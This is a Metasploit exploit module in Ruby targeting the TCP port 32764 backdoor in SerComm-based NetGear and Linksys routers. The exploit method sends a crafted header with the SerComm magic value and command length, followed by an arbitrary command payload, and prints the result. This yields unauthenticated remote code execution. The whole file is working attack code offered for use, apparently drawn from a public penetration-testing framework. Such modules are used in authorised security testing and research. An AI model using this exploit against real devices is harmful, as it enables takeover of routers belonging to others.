require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SerComm Device Remote Code Execution",
      'Description'    => %q{
          This module will cause remote code execution on several SerComm devices. These
          devices typically include routers from NetGear and Linksys.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>',   #Initial discovery, poc
          'Matt "hostess" Andreko <mandreko[at]accuvant.com>',  #Msf module
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget' => 0,
      'References'     =>
        [
          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ],
        ],
      'DisclosureDate' => "Dec 31 2013" ))

      register_options(
        [
          Opt::RPORT(32764),
        ], self.class)
  end

  def exploit

    connect

    cmd = payload.encoded
    cmd_length = cmd.length()
    print_debug("Cmd: #{cmd}")

    data = [0x53634d4d, 0x07, cmd_length].pack("VVV")
    sock.put(data+cmd)

    junk = sock.get_once # The MMcS text shows up again for some reason
    res = sock.get(3, 3)

    disconnect

    print_status("Result of the command:\n#{res}")

  end

end
